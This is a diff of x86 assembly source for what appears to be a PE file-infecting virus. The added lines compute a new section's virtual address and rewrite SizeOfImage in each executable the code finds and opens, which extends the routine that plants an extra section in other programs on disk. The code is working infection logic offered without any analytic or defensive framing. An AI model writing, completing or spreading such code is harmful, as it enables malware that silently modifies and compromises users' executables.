@@ -253,12 +253,17 @@ start:
     add ecx, edx
     toStack lastish_offset, ecx
     
+    ; Obtain lastish.VirtualAddress
     add ecx, 12
     getval fromStack(tgHand), 4, SEEK_SET, ecx
-    toStack lastish_VA, vaccess(tempDword)
+	mov edx, vaccess(tempDword)
     
+    ; Obtain lastish.SizeOfRawData
     getval fromStack(tgHand), 4
-    toStack lastish_SizeOfRawData, vaccess(tempDword)
+	add edx, vaccess(tempDword)
+	
+	closest edx, fromStack(SectionAlignment)
+	mov daccess(ishVirtualAddress), eax
     
     mov ecx, fromStack(lastish_offset)
     add ecx, 40
@@ -318,13 +323,20 @@ start:
 	invoke fromStack(fwrite), fromStack(tgHand), daccess(ishName), 40, daccess(tempDword2), 0
 	
 	; Edit SizeOfImage
-	
+	mov ebx, fromStack(ioh_offset)
+	add ebx, 56
+	getval fromStack(tgHand), 4, SEEK_SET, ebx
+	mov eax, vaccess(tempDword)
+	add eax, vaccess(ishSizeOfRawData)
+	closest eax, fromStack(SectionAlignment)
+	mov daccess(tempDword), eax
+	invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
+	invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
 	
     nextFile:
     invoke fromStack(fclose), fromStack(tgHand)
     
     invoke fromStack(ffind2), fromStack(fileHand), daccess(offset temp320B)
-    		
     cmp eax, 0
     jne openFile
     
